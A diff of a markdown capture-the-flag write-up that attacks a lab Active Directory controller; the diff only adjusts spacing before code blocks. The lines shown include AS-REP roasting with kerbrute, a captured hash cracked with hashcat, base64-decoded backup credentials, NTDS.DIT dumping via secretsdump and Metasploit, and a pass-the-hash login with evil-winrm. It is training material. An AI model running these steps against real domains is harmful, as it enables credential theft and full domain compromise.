@@ -130,7 +130,7 @@ Enumerate port 139/445 with```enum4linux -U -o 10.10.12.33```
 
 ## Abusing Kerberos
 
-ASREPRoasting with kerbrute and the provided userlist:```./kerbrute -domain spookysec.local -dc-ip 10.10.12.33  -users ~/userlist.txt```
+ASREPRoasting with kerbrute and the provided userlist: ```./kerbrute -domain spookysec.local -dc-ip 10.10.12.33  -users ~/userlist.txt```
 
 ??? output "kerbrute output"
     ``` txt
@@ -167,7 +167,7 @@ ASREPRoasting with kerbrute and the provided userlist:```./kerbrute -domain spoo
     $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:fea34e6cdca777efe84cbdeaa48d35b9$cf364f98148fce49cc67dd350754a9c9ccf20dd516b1c2c6aecb6984aba91fca5b386b4ba7b59434f54440ecccdd549533157318a55752abe941976eae78132f61832fba98bc391ee52c51e924cd8d091b6e6d854bc16e769184867024f195936687839c4e63cf54f7a2e1749020c279e3b08f78826ca90deffcda9bdd721a87166fa6e9fe6f68cd493751df05b2ae92a0e5e466f8c674bf16c346e9ee9714f7098369d90dad8e5bac5b4ac316e94ff65acd8914a356450be18b671db831031c6a709369d586d704bc827f2221f3edfd60e5f675fb6ac97570e20bd094362e354b63279e757486c82162d6ae04467d7c1261
     ```
 
-We recieved a Kerberos Ticket (Kerberos 5 AS-REP etype 23, mode 18200) which we can crack using hashcat and the provided passwordlist:```hashcat -a 0 -m 18200 ~/example.hash ~/passwordlist.txt```
+We recieved a Kerberos Ticket (Kerberos 5 AS-REP etype 23, mode 18200) which we can crack using hashcat and the provided passwordlist: ```hashcat -a 0 -m 18200 ~/example.hash ~/passwordlist.txt```
 
 ??? output "hashcat output"
     ``` txt
@@ -229,7 +229,7 @@ We recieved a Kerberos Ticket (Kerberos 5 AS-REP etype 23, mode 18200) which we 
 
 ## Back to the Basics 
 
-Let's enumerate any shares that the domain controller may be giving out with smbclient:```smbclient -L \\\\10.10.12.33 -U svc-admin@spookysec.local```
+Let's enumerate any shares that the domain controller may be giving out with smbclient: ```smbclient -L \\\\10.10.12.33 -U svc-admin@spookysec.local```
 
 ??? output "smbclient user output"
     ``` txt
@@ -246,7 +246,7 @@ Let's enumerate any shares that the domain controller may be giving out with smb
     SMB1 disabled -- no workgroup available
     ```
 
-Backup seems like an interesting share. Let's view it's content:```smbclient \\\\10.10.12.33\\backup -U svc-admin@spookysec.local```
+Backup seems like an interesting share. Let's view it's content: ```smbclient \\\\10.10.12.33\\backup -U svc-admin@spookysec.local```
 
 ??? output "smbclient backup output"
     ``` txt
@@ -261,7 +261,7 @@ Backup seems like an interesting share. Let's view it's content:```smbclient \\\
     smb: \> more backup_credentials.txt
     ```
 
-backup_credentials.txt contains some kind of hash which we can try to identify e.g. with [decodify](https://github.com/s0md3v/Decodify):```dcode YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw```
+backup_credentials.txt contains some kind of hash which we can try to identify e.g. with [decodify](https://github.com/s0md3v/Decodify): ```dcode YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw```
 
 ??? output "dcode backup_credentials.txt"
     ``` txt
@@ -276,11 +276,11 @@ backup_credentials.txt contains some kind of hash which we can try to identify e
 
 ## Elevating Privileges within the Domain
 
-Now that we know this is Base64 we can run this command to read the content:```echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d```
+Now that we know this is Base64 we can run this command to read the content: ```echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d```
 
-Running secretsdump.py didn't work for me e.g.:```secretsdump.py spookysec.local/backup:backup2517860@10.10.12.33 -use-vss```
+Running secretsdump.py didn't work for me e.g.: ```secretsdump.py spookysec.local/backup:backup2517860@10.10.12.33 -use-vss```
 
-So i used metasploit with secretsdump.py und set lhost, SMBDomain, RHOSTS, SMBPass and SMBUser accordingly:```msfconsole```
+So i used metasploit with secretsdump.py und set lhost, SMBDomain, RHOSTS, SMBPass and SMBUser accordingly: ```msfconsole```
 
 ??? output "metasplot with secretsdump.py"
     ``` txt
@@ -399,7 +399,7 @@ So i used metasploit with secretsdump.py und set lhost, SMBDomain, RHOSTS, SMBPa
     [*] Auxiliary module execution completed
     ```
 
-Secretsdump.py uses the DRSUAPI method to get NTDS.DIT secrets. We can feed evil-winrm with the hash of the adminstrator to gain access using this command:```evil-winrm -i 10.10.12.33 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc```
+Secretsdump.py uses the DRSUAPI method to get NTDS.DIT secrets. We can feed evil-winrm with the hash of the adminstrator to gain access using this command: ```evil-winrm -i 10.10.12.33 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc```
 
 ??? output "evil-winrm output and flags"
     ``` txt
